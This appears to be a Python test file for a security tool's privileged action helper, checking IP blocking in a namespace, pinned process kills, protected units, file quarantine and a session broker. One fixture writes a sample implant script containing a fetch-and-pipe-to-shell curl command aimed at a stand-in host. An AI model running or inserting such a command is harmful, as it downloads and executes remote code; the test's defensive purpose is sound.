"""
tests/test_action_helper.py: the root action helper's guards and verbs.

Runs unelevated. The nft verbs run inside `unshare -rn`, a private network
namespace, so nothing touches this host's firewall. Kill uses processes this
test starts. Quarantine uses a temporary vault. stop_unit and disable_unit
are exercised for their refusals only, because a real stop needs root.

  1. the verb table and argument counts
  2. addresses that are never blocked
  3. block, read back, unblock, read back (in a namespace)
  4. kill, pinned by name and start time, with its refusals
  5. unit names and protected units
  6. quarantine and restore, with the path guards and the hash pin
  7. the session broker: requests on a pipe, EOF ends it, the age cap
"""
import hashlib
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

fails = []


def check(label, got, want):
    ok = got == want
    print(f"  {'PASS' if ok else 'FAIL'}  {label}: {got!r}" + ("" if ok else f"  (want {want!r})"))
    if not ok:
        fails.append(label)


from tools import action_helper as ah  # noqa: E402

tmp = pathlib.Path(tempfile.mkdtemp())
ah.LOG_DIR = str(tmp / "log")
ah.LOG_PATH = str(tmp / "log" / "action_helper.log")
ah.QUARANTINE_DIR = str(tmp / "vault")


def refused(reply):
    return (not reply["ok"]) and bool(reply.get("refused"))


print("\n[1] the verb table")
check("an unknown verb is refused", refused(ah.handle("shell", ["id"])), True)
check("a wrong argument count is refused",
      refused(ah.handle("block_ip", ["1.2.3.4", "5.6.7.8"])), True)
check("a non-text argument is refused",
      refused(ah.handle("block_ip", [1234])), True)
check("every call is logged, refusals included",
      len(pathlib.Path(ah.LOG_PATH).read_text().splitlines()), 3)
check("a helper at a user-owned path refuses to run",
      bool(ah.self_problems()), True)


print("\n[2] addresses never blocked")
ah._host_addresses = lambda: {"192.0.2.1", "192.0.2.207", "11.22.33.53"}
for ip, why in (("127.0.0.1", "loopback"), ("0.0.0.0", "unspecified"),
                ("224.0.0.1", "multicast"), ("fe80::1", "link-local"),
                ("192.0.2.0/24", "a range"), ("192.0.2.1", "the gateway"),
                ("192.0.2.207", "this host"), ("11.22.33.53", "the resolver"),
                ("example.com", "not an address")):
    check(f"{why} is refused", refused(ah.handle("block_ip", [ip])), True)


print("\n[3] block and unblock, in a private network namespace")
if shutil.which("unshare") and shutil.which("nft"):
    script = f"""
import json, sys
sys.path.insert(0, {str(ROOT)!r})
from tools import action_helper as ah
ah.LOG_DIR = {str(tmp / 'nslog')!r}
ah.LOG_PATH = {str(tmp / 'nslog' / 'l')!r}
out = {{}}
out['block'] = ah.handle('block_ip', ['203.0.113.9'])
out['again'] = ah.handle('block_ip', ['203.0.113.9'])
out['v6'] = ah.handle('block_ip', ['2001:db8::9'])
out['list'] = ah.handle('list_blocks', [])
out['unblock'] = ah.handle('unblock_ip', ['203.0.113.9'])
out['unblock_absent'] = ah.handle('unblock_ip', ['203.0.113.9'])
out['list_after'] = ah.handle('list_blocks', [])
print(json.dumps(out))
"""
    res = subprocess.run(["unshare", "-rn", sys.executable, "-c", script],
                         capture_output=True, text=True, timeout=60)
    if res.returncode != 0:
        check("the namespace run completed", res.stderr[-300:], "")
    else:
        out = json.loads(res.stdout.strip().splitlines()[-1])
        check("an address is blocked and read back",
              out["block"]["ok"] and out["block"]["result"]["verified_by"]
              == "read back from the nft set", True)
        check("blocking it again says so", out["again"]["result"]["already"], True)
        check("an IPv6 address goes to its own set",
              out["v6"]["result"]["set"], "blocked6")
        check("the list names both",
              sorted(out["list"]["result"]["blocked"]),
              ["2001:db8::9", "203.0.113.9"])
        check("unblock lifts it and reads back",
              out["unblock"]["result"]["was_blocked"], True)
        check("unblocking what is not blocked says so, not success theatre",
              out["unblock_absent"]["result"]["was_blocked"], False)
        check("the list after", out["list_after"]["result"]["blocked"],
              ["2001:db8::9"])
else:
    print("  SKIP  unshare or nft is not available")


print("\n[4] kill, pinned")


def ident(pid):
    comm, _, ticks = ah._stat_fields(pid)
    return comm, str(ticks)


p = subprocess.Popen(["sleep", "60"])
time.sleep(0.2)
comm, ticks = ident(p.pid)
check("a wrong start time is refused, nothing signalled",
      refused(ah.handle("kill", [str(p.pid), comm, str(int(ticks) + 1)]))
      and p.poll() is None, True)
check("a wrong name is refused, nothing signalled",
      refused(ah.handle("kill", [str(p.pid), "bash", ticks]))
      and p.poll() is None, True)
out = ah.handle("kill", [str(p.pid), comm, ticks])
p.wait(timeout=5)
check("the pinned process is ended and confirmed through its pidfd",
      out["ok"] and out["result"]["gone"], True)
check("pid 1 is refused", refused(ah.handle("kill", ["1", "systemd", "1"])), True)
check("the helper's own parent is refused",
      refused(ah.handle("kill", [str(os.getppid()), "x", "1"])), True)

fake = tmp / "cron"
shutil.copy("/bin/sleep", fake)
p = subprocess.Popen([str(fake), "60"])
time.sleep(0.2)
comm, ticks = ident(p.pid)
out = ah.handle("kill", [str(p.pid), comm, ticks])
check("a process named like a critical one is refused",
      refused(out) and "never signals" in out["refused"], True)
check("and was left running", p.poll(), None)
p.kill()
p.wait()

p = subprocess.Popen(["/bin/sh", "-c", "sleep 60",
                      "/usr/local/lib/agentalsec/ebpf/ebpf_monitor.py"])
time.sleep(0.2)
comm, ticks = ident(p.pid)
out = ah.handle("kill", [str(p.pid), comm, ticks])
check("a process that is part of AgentalSec is refused",
      refused(out) and "part of AgentalSec" in out["refused"], True)
p.kill()
p.wait()


print("\n[5] units")
for unit in ("agentalsec-ebpf-camera.service", "systemd-journald.service",
             "auditd.service", "ufw.service", "apparmor.service",
             "NetworkManager.service", "cron.service", "user@1000.service",
             "getty@tty1.service"):
    check(f"{unit} is protected",
          refused(ah.handle("stop_unit", [unit])), True)
for unit in ("--now", "foo", "foo.mount", "../x.service", "a b.service"):
    check(f"{unit!r} is not a unit name this accepts",
          refused(ah.handle("disable_unit", [unit])), True)


print("\n[6] quarantine and restore")
target = tmp / "work" / "implant.sh"
target.parent.mkdir()
target.write_bytes(b"#!/bin/sh\ncurl http://198.51.100.1/x | sh\n")
os.chmod(target, 0o750)
sha = hashlib.sha256(target.read_bytes()).hexdigest()
check("a wrong hash pin is refused and the file stays",
      refused(ah.handle("quarantine", [str(target), "0" * 64]))
      and target.exists(), True)
out = ah.handle("quarantine", [str(target), sha])
check("the pinned file is moved", out["ok"] and not target.exists(), True)
qid = out["result"]["id"] if out["ok"] else ""
held = pathlib.Path(ah.QUARANTINE_DIR) / qid
check("the held copy is read-only and hashes the same",
      (oct(held.joinpath("payload").stat().st_mode & 0o777),
       hashlib.sha256(held.joinpath("payload").read_bytes()).hexdigest()),
      ("0o400", sha))
check("the vault is private", oct(pathlib.Path(ah.QUARANTINE_DIR).stat().st_mode & 0o777), "0o700")
listed = ah.handle("list_quarantine", [])["result"]["held"]
check("it is listed", [h["original_path"] for h in listed], [str(target)])
target.write_text("something new")
check("a restore does not overwrite a file that came back",
      refused(ah.handle("restore", [qid])), True)
target.unlink()
out = ah.handle("restore", [qid])
check("a restore puts it back with its mode",
      out["ok"] and oct(target.stat().st_mode & 0o777), "0o750")
check("and the contents", hashlib.sha256(target.read_bytes()).hexdigest(), sha)

link = tmp / "work" / "link"
link.symlink_to(target)
check("a symlink is refused", refused(ah.handle("quarantine", [str(link), "-"])), True)
for path, why in (("/etc/passwd", "a login file"),
                  ("/usr/bin/ls", "a system program"),
                  ("/var/lib/agental_sec/ebpf_events.db", "AgentalSec's own"),
                  ("/etc/pam.d/common-auth", "PAM"),
                  ("/usr/share/common-licenses/GPL-3", "a package's file"),
                  (str(tmp / "work" / ".." / "work" / "implant.sh"), "a '..' path"),
                  ("relative/path", "a relative path")):
    check(f"{why} is refused", refused(ah.handle("quarantine", [path, "-"])), True)
check("a made-up quarantine id is refused",
      refused(ah.handle("restore", ["../../etc"])), True)


print("\n[7] the session broker")
broker = f"""
import sys
sys.path.insert(0, {str(ROOT)!r})
from tools import action_helper as ah
ah.LOG_DIR = {str(tmp / 'blog')!r}
ah.LOG_PATH = {str(tmp / 'blog' / 'l')!r}
ah.serve(float(sys.argv[1]))
"""
p = subprocess.Popen([sys.executable, "-c", broker, "1"], stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE, text=True)
hello = json.loads(p.stdout.readline())
check("it announces itself ready with its cap", (hello["ready"], hello["max_age_hours"]), (True, 1.0))
p.stdin.write(json.dumps({"id": 7, "verb": "block_ip", "args": ["127.0.0.1"]}) + "\n")
p.stdin.flush()
reply = json.loads(p.stdout.readline())
check("a request gets a reply with its id", (reply["id"], reply["ok"]), (7, False))
p.stdin.write("not json\n")
p.stdin.flush()
check("a malformed line is answered, not fatal",
      json.loads(p.stdout.readline())["ok"], False)
p.stdin.close()
check("closing the pipe ends the session", p.wait(timeout=5), 0)
logged = [json.loads(line)["verb"] for line in
          (tmp / "blog" / "l").read_text().splitlines()]
check("the session start, the request and the end are logged", logged,
      ["session_start", "block_ip", "session_end"])

p = subprocess.Popen([sys.executable, "-c", broker, "0.0000001"],
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
p.stdout.readline()
time.sleep(0.1)
p.stdin.write(json.dumps({"id": 1, "verb": "list_blocks", "args": []}) + "\n")
p.stdin.flush()
reply = json.loads(p.stdout.readline())
check("past its cap it refuses and closes", (reply.get("expired"), p.wait(timeout=5)), (True, 0))

shutil.rmtree(tmp, ignore_errors=True)
print()
if fails:
    print(f"{len(fails)} FAILED: {fails}")
    sys.exit(1)
print("all passed")
